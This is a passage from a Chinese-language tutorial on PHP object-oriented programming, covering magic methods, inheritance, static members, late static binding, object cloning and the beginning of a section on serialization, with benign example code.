class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;salary&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;age&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;name) ? <span class="string">&#x27;存在&#x27;</span>: <span class="string">&#x27;不存在&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;name);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121111954.png" /></p>
<p>可以看到，<code>name</code> 被删除了。如果没有
<code>__isset()</code>，<code>echo isset($obj-&gt;name) ? '存在': '不存在';</code>
的结果是不存在。</p>
<p>但 <code>__unset</code> 也会遵循 <code>__set()</code>
中的规则，比如上述中 <code>__set()</code> 规定了不允许修改
<code>age</code>，那么 <code>__unset()</code> 就无法销毁
<code>age</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;name);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121112207.png" /></p>
<h1 id="类的继承与多态的实现方法">8. 类的继承与多态的实现方法</h1>
<blockquote>
<p>PHP 是单继承语言，因此 <code>extends</code> 后面只能写一个父类；</p>
</blockquote>
<ul>
<li><strong>public</strong>：外部可调用，内部可调用，子类可调用</li>
<li><strong>protected</strong>：外部不可调用，内部可调用，子类可以调用</li>
<li><strong>private</strong>：外部不可调用，内部可调用，子类不可调用</li>
<li>权限从上到下越来越高；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showMess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">&#x27;, salary: &#x27;</span>.<span class="keyword">$this</span>-&gt;salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$department</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span>, <span class="variable">$department</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 方法重写</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showMess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">&#x27;, salary: &#x27;</span>.<span class="keyword">$this</span>-&gt;salary.<span class="string">&#x27;, department: &#x27;</span>.<span class="keyword">$this</span>-&gt;department;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>, <span class="string">&#x27;开发部&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;showMess();</span><br></pre></td></tr></table></figure>
<p>方法重写的时候需要记住：</p>
<ul>
<li>子类中的方法权限要低于父类。</li>
</ul>
<p>上面的方法重写太冗余了，有的在父类中已经实现的就可以不用写了，改写成如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showMess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">&#x27;, salary: &#x27;</span>.<span class="keyword">$this</span>-&gt;salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$department</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span>, <span class="variable">$department</span></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showMess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::showMess().<span class="string">&#x27;, department: &#x27;</span>.<span class="keyword">$this</span>-&gt;department;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>, <span class="string">&#x27;开发部&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;showMess();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121113603.png" /></p>
<h1 id="类中静态成员的创建与访问技巧">9.
类中静态成员的创建与访问技巧</h1>
<ul>
<li><strong>访问控制符</strong>：指示类成因在哪里可以被访问；</li>
<li><strong>成员状态符</strong>：指示如何访问该成员：
<ul>
<li>静态：<code>self</code>、<code>parent</code>、<code>static</code></li>
<li>非静态：<code>$this-&gt;</code></li>
</ul></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$age</span> = <span class="string">&#x27;18&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$salary</span> = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;age: &#x27;</span>.<span class="built_in">self</span>::<span class="variable">$age</span>.<span class="string">&#x27;, salary: &#x27;</span>.<span class="built_in">self</span>::<span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;salary: &#x27;</span>.<span class="built_in">parent</span>::<span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>静态方法是所有类
（包括子类）实例共享的，不需要虚拟实例，也无法使用伪变量
<code>$this</code>，静态属性只允许在静态方法中访问；</li>
<li>公共静态属性：类内部、外部、子类均可访问；</li>
<li>私有静态属性：只能类内部访问；</li>
<li>私有受保护属性：类内部、子类均可访问；</li>
<li>访问静态属性必须加 <code>$</code>；</li>
</ul>
<p><strong>静态成员包括静态属性和静态方法。静态成员的访问技巧</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 外部访问静态成员，使用 类名::静态成员，静态属性必须加 `$`</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.Father::<span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> Father::show();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 子类访问父类的静态方法</span></span><br><span class="line"><span class="keyword">echo</span> Son::show();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 访问子类的静态方法</span></span><br><span class="line"><span class="keyword">echo</span> Son::display();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 外部对象访问静态方法</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Father;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;show();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 外部对象无法访问静态属性</span></span><br><span class="line"><span class="comment"># echo $obj-&gt;$name;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121115336.png" /></p>
<p><strong>关键字 <code>instanceof</code>
使用</strong>：判断对象是否属于某个类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> Son();</span><br><span class="line"><span class="variable">$r1</span> = <span class="variable">$obj1</span> <span class="keyword">instanceof</span> Father;</span><br><span class="line"><span class="variable">$r2</span> = <span class="variable">$obj1</span> <span class="keyword">instanceof</span> Son;</span><br><span class="line"><span class="variable">$r3</span> = <span class="variable">$obj2</span> <span class="keyword">instanceof</span> Father;</span><br><span class="line"><span class="variable">$r4</span> = <span class="variable">$obj2</span> <span class="keyword">instanceof</span> Son;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$obj1是Father的实例吗？&#x27;</span>.(<span class="variable">$r1</span> ? <span class="string">&#x27;yes&#x27;</span>: <span class="string">&#x27;no&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$obj1是Son的实例吗？&#x27;</span>.(<span class="variable">$r2</span> ? <span class="string">&#x27;yes&#x27;</span>: <span class="string">&#x27;no&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$obj2是Father的实例吗？&#x27;</span>.(<span class="variable">$r3</span> ? <span class="string">&#x27;yes&#x27;</span>: <span class="string">&#x27;no&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$obj2是Son的实例吗？&#x27;</span>.(<span class="variable">$r4</span> ? <span class="string">&#x27;yes&#x27;</span>: <span class="string">&#x27;no&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121115739.png" /></p>
<p>可以观察到，<strong>子类的实例也属于父类的实例，但父类的实例不属于子类的实例</strong>。</p>
<h1 id="类的静态绑定和延迟静态绑定selfparentstatic">10.
类的静态绑定和延迟静态绑定（self、parent、static）</h1>
<p>两个概念：</p>
<ul>
<li><strong>静态绑定</strong>：在代码的编译阶段进行，包括
<code>self</code> 和 <code>parent</code>；</li>
<li><strong>静态延迟绑定</strong>：在代码的运行阶段进行，也可以叫做动态绑定，只有
<code>static</code>；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;姓名是：&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$name</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> <span class="keyword">extends</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="variable">$name</span>.<span class="string">&#x27;的城市是：&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$city</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Demo::show();</span><br><span class="line"><span class="keyword">echo</span> Demo2::show();</span><br></pre></td></tr></table></figure>
<p>在编译阶段：</p>
<ul>
<li><code>self:name</code>
进行静态绑定，可以理解为在后面的代码运行时，此处变成
<code>Demo-&gt;name</code>（理解使用）；</li>
<li><code>parent::name</code>
进行静态绑定，理解为在后面的代码运行时，此处变为
<code>Demo-&gt;name</code>；</li>
</ul>
<p>静态延迟绑定则，它的作用和 <code>self</code>
类似，不过是在运行阶段进行绑定，且绑定到调用者所属的类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;城市是：&#x27;</span>.<span class="built_in">static</span>::<span class="variable">$city</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> <span class="keyword">extends</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">dispalay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="variable">$name</span>.<span class="string">&#x27;的城市是：&#x27;</span>.<span class="built_in">static</span>::<span class="variable">$city</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Demo2::show();</span><br></pre></td></tr></table></figure>
<p>我们修改了 <code>Demo</code> 的 <code>show()</code>
方法，在里面调用了 <code>$city</code>，而 <code>Demo</code>
是没有该属性的，但这里还是能够成功访问.</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121121357.png" /></p>
<p>这是因为调用 <code>show</code> 方法的是 <code>Demo2</code>，而不是
<code>Demo</code>，<code>Demo2</code> 没有 <code>show()</code>
方法，因此调用父类的 <code>show()</code>
方法，需要注意，<strong>这里的调用者一直是
<code>Demo2</code></strong>，所以 <code>show()</code> 中的
<code>static::$city</code> 绑定的是 <code>Demo2</code>，也就是
<code>Demo2-&gt;city</code>，所以能够访问到。</p>
<h1 id="对象克隆技术">11. 对象克隆技术</h1>
<p>关键字 <code>clone</code>
：克隆出一个新的对象，把原来对象的值传入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Demo;</span><br><span class="line"><span class="variable">$obj2</span> = <span class="variable">$obj1</span>;</span><br><span class="line"><span class="variable">$obj3</span> = <span class="keyword">clone</span> <span class="variable">$obj1</span>;</span><br><span class="line"><span class="variable">$obj1</span>-&gt;name = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;原来对象的值：&#x27;</span>.<span class="variable">$obj1</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;引用对象的值：&#x27;</span>.<span class="variable">$obj2</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;克隆对象的值：&#x27;</span>.<span class="variable">$obj3</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121143446.png" /></p>
<p>可以看到，我们修改 <code>$obj1</code> 的值，<code>$obj2</code>
的值也会跟着修改，因为 <code>$obj2</code> 是引用对象，而
<code>$obj3</code> 是克隆对象，是一个新的对象，与 <code>$obj1</code>
独立，所以 <code>$obj3</code> 的值没有被修改。</p>
<h1 id="访问一个不存在的方法">12. 访问一个不存在的方法</h1>
<p>两个魔术方法：</p>
<ul>
<li><code>__call($method, $args)</code>
：第一个参数是方法名，第二个参数是传入参数列表，以数组形式传入；</li>
<li><code>__callStatic($method, $args)</code>
：第一个参数是方法名，第二个参数是传入参数列表，以数组形式传入；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 遍历参数</span></span><br><span class="line">        <span class="variable">$var</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$var</span> .= <span class="variable">$val</span>.<span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;方法&#x27;</span>.<span class="variable">$method</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$var</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;不存在&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 遍历参数</span></span><br><span class="line">        <span class="variable">$var</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$var</span> .= <span class="variable">$val</span>.<span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;方法&#x27;</span>.<span class="variable">$method</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$var</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;不存在&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Demo)-&gt;hello(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;python&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> Demo::hello(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>当调用类中不存在的方法是，则会自动调用
<code>__call()</code>；当调用类中不存在的静态方法时，则会自动调用
<code>__callStatic()</code>。</p>
<h1 id="对象的序列化">13. 对象的序列化</h1>
<p>序列化：将对象转为二进制的字符串。涉及到以下 4 个函数：</p>
<ul>
<li><code>serialize($obj)</code> ：序列化对象；</li>
<li><code>unserilize($str)</code> ：将字符串反序列化；</li>
<li>魔术方法 <code>__sleep()</code>
：序列化时自动调用，限制序列化的参数；</li>
<li>魔术方法 <code>__wakeup()</code>
：反序列化时自动调用，可以在反序列化生成对象时对属性进行修改；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$city</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;city = <span class="variable">$city</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;fuzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="variable">$obj1</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="variable">$obj1</span>-&gt;age.<span class="string">&#x27;, city: &#x27;</span>.<span class="variable">$obj1</span>-&gt;city.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$objStr</span> = serialize(<span class="variable">$obj1</span>);  <span class="comment"># 序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$objStr</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span>= unserialize(<span class="variable">$objStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="variable">$obj2</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span 